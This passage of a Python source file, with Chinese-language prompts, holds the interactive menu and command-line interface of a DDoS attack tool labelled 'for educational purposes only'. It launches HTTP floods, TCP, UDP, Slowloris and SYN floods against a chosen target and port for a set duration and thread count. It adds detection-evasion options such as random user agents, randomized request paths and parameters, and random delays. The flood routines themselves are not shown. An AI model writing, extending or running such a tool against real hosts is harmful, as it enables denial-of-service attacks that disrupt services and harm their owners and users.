                    data_size = 2048
            except ValueError:
                print(f"{Fore.RED}[!] 数据大小应为整数，将使用默认值2048{Style.RESET_ALL}")
                data_size = 2048
        else:
            data_size = 2048
        
        randomize_requests = input(f"{Fore.GREEN}是否随机化请求参数和路径? (y/n, 默认为y): {Style.RESET_ALL}")
        randomize_requests = randomize_requests.lower() != 'n'
        if randomize_requests:
            print(f"{Fore.YELLOW}[*] 将随机化HTTP请求参数、路径和头部{Style.RESET_ALL}")
        
        # 修改start_attack调用，添加use_post和data_size参数
        start_attack(attack_type, target, port, duration, threads, user_agent=user_agent, http_post=use_post, http_data_size=data_size)
    elif choice == "2":
        attack_type = "TCP"
        start_attack(attack_type, target, port, duration, threads)
    elif choice == "3":
        attack_type = "UDP"
        try:
            packet_size = int(input(f"{Fore.GREEN}请输入数据包大小(字节): {Style.RESET_ALL}"))
            if packet_size < 1:
                print(f"{Fore.RED}[!] 数据包大小应大于0{Style.RESET_ALL}")
                return interactive_menu()
        except ValueError:
            print(f"{Fore.RED}[!] 数据包大小应为整数{Style.RESET_ALL}")
            return interactive_menu()
        
        start_attack(attack_type, target, port, duration, threads, packet_size=packet_size)
    elif choice == "4":
        attack_type = "SLOWLORIS"
        try:
            socket_count = int(input(f"{Fore.GREEN}请输入每个线程的连接数 (默认150): {Style.RESET_ALL}"))
            if not socket_count:
                socket_count = 150
            elif socket_count < 1:
                print(f"{Fore.RED}[!] 连接数应大于0，将使用默认值150{Style.RESET_ALL}")
                socket_count = 150
        except ValueError:
            print(f"{Fore.RED}[!] 连接数应为整数，将使用默认值150{Style.RESET_ALL}")
            socket_count = 150
        
        start_attack(attack_type, target, port, duration, threads, socket_count=socket_count)
    elif choice == "5" and SCAPY_AVAILABLE:
        attack_type = "SYN"
        start_attack(attack_type, target, port, duration, threads, use_scapy=True)
    
    # 询问是否继续
    choice = input(f"{Fore.GREEN}是否继续? (y/n): {Style.RESET_ALL}")
    if choice.lower() == "y":
        return interactive_menu()
    else:
        print(f"{Fore.YELLOW}[*] 退出程序{Style.RESET_ALL}")
        sys.exit(0)

def main():
    """主函数"""
    # 创建命令行参数解析器
    parser = argparse.ArgumentParser(description="DDoS攻击工具 - 仅供教育目的")
    parser.add_argument("-t", "--target", help="目标IP地址或域名")
    parser.add_argument("-p", "--port", type=int, help="目标端口")
    parser.add_argument("-a", "--attack", choices=["http", "tcp", "udp", "syn", "slowloris"], help="攻击类型: http, tcp, udp, syn (需要Scapy), slowloris")
    parser.add_argument("-d", "--duration", type=int, help="攻击持续时间(秒)")
    parser.add_argument("-T", "--threads", type=int, default=20, help="线程数 (默认: 20, 推荐: 10-50)")
    parser.add_argument("-s", "--size", type=int, default=1024, help="数据包大小(字节) (默认: 1024)")
    parser.add_argument("-u", "--user-agent", default="Mozilla/5.0", help="HTTP请求的User-Agent (默认: Mozilla/5.0，使用'random'表示随机User-Agent)")
    parser.add_argument("--random-ua", action="store_true", help="使用随机User-Agent (覆盖-u参数)")
    parser.add_argument("--scapy", action="store_true", help="使用Scapy进行攻击（仅SYN攻击）")
    parser.add_argument("--post", action="store_true", help="使用POST请求（仅HTTP攻击）")
    parser.add_argument("--socket-count", type=int, default=100, help="SlowLoris攻击的每线程连接数 (默认: 100)")
    parser.add_argument("--check", action="store_true", help="在攻击前检查目标可达性")
    parser.add_argument("--save", action="store_true", help="自动保存攻击结果")
    parser.add_argument("--delay", action="store_true", help="在请求之间添加随机延迟（仅HTTP攻击）")
    parser.add_argument("--timeout", type=int, default=3, help="请求超时时间(秒) (默认: 3)")
    
    args = parser.parse_args()
    
    # 检查是否有足够的参数启动攻击
    if args.target and args.port and args.attack and args.duration:
        # 如果输入的是域名，尝试解析为IP
        if not validate_ip(args.target):
            ip = get_ip_from_domain(args.target)
            if ip:
                print(f"{Fore.YELLOW}[*] 域名 {args.target} 解析为 IP: {ip}{Style.RESET_ALL}")
                args.target = ip
            else:
                print(f"{Fore.RED}[!] 无法解析域名 {args.target}{Style.RESET_ALL}")
                sys.exit(1)
        
        # 检查线程数是否在合理范围内
        if args.threads > 200:
            print(f"{Fore.YELLOW}[!] 警告: 线程数 ({args.threads}) 过多，推荐使用 10-50 个线程{Style.RESET_ALL}")
            confirm = input(f"{Fore.GREEN}是否继续使用 {args.threads} 个线程? (y/n，选n将使用100个线程): {Style.RESET_ALL}")
            if confirm.lower() != 'y':
                args.threads = 100
                print(f"{Fore.YELLOW}[*] 已调整为 100 个线程{Style.RESET_ALL}")
                
        # 检查目标可达性
        if args.check:
            print(f"{Fore.YELLOW}[*] 正在检查目标 {args.target}:{args.port} 的可达性...{Style.RESET_ALL}")
            if not check_target_availability(args.target, args.port):
                print(f"{Fore.RED}[!] 目标 {args.target}:{args.port} 不可达，请检查目标或网络连接{Style.RESET_ALL}")
                choice = input(f"{Fore.GREEN}是否仍要继续攻击? (y/n): {Style.RESET_ALL}")
                if choice.lower() != 'y':
                    sys.exit(1)
            else:
                print(f"{Fore.GREEN}[+] 目标 {args.target}:{args.port} 可达，可以进行攻击{Style.RESET_ALL}")
        
        # 启动攻击
        if args.attack == "http":
            # 处理随机User-Agent选项
            if args.random_ua:
                user_agent = "random"
                print(f"{Fore.YELLOW}[*] 使用随机User-Agent{Style.RESET_ALL}")
            elif args.user_agent.lower() == "random":
                user_agent = "random"
                print(f"{Fore.YELLOW}[*] 使用随机User-Agent{Style.RESET_ALL}")
            else:
                user_agent = args.user_agent
            
            start_attack("HTTP", args.target, args.port, args.duration, args.threads, 
                        user_agent=user_agent, http_post=args.post, http_data_size=args.size)
        elif args.attack == "tcp":
            start_attack("TCP", args.target, args.port, args.duration, args.threads)
        elif args.attack == "udp":
            start_attack("UDP", args.target, args.port, args.duration, args.threads, packet_size=args.size)
        elif args.attack == "slowloris":
            start_attack("SLOWLORIS", args.target, args.port, args.duration, args.threads, socket_count=args.socket_count)
        elif args.attack == "syn":
            if not SCAPY_AVAILABLE and args.scapy:
                print(f"{Fore.RED}[!] Scapy模块不可用，无法执行高级SYN攻击{Style.RESET_ALL}")
                choice = input(f"{Fore.GREEN}是否使用普通TCP SYN攻击? (y/n): {Style.RESET_ALL}")
                if choice.lower() != 'y':
                    sys.exit(1)
                start_attack("TCP", args.target, args.port, args.duration, args.threads)
            else:
                start_attack("SYN", args.target, args.port, args.duration, args.threads, use_scapy=args.scapy)
    else:
        # 启动交互式菜单
        interactive_menu()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Fore.RED}[!] 程序被用户中断{Style.RESET_ALL}")
        sys.exit(0) 